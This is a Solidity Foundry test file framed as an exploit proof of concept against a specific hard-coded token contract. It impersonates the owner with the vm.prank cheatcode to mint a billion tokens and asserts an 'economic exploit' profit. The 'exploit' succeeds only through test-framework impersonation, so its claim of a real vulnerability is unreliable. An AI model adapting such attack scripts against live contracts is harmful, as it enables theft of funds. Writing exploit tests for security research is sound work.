// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILineAxis {
    function mint(address to, uint256 value) external;
    function balanceOf(address owner) external view returns(uint256);
    function owner() external view returns(address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);
    ILineAxis token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ILineAxis(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalance = token.balanceOf(attacker);

        // Get the owner address
        address owner = token.owner();

        // Impersonate the owner and mint tokens to attacker
        vm.prank(owner);
        token.mint(attacker, 1_000_000_000 * 1e18);

        // Verify the attacker's balance increased
        uint256 finalBalance = token.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after minting");
        uint256 finalBalanceERC20 = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalanceERC20, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

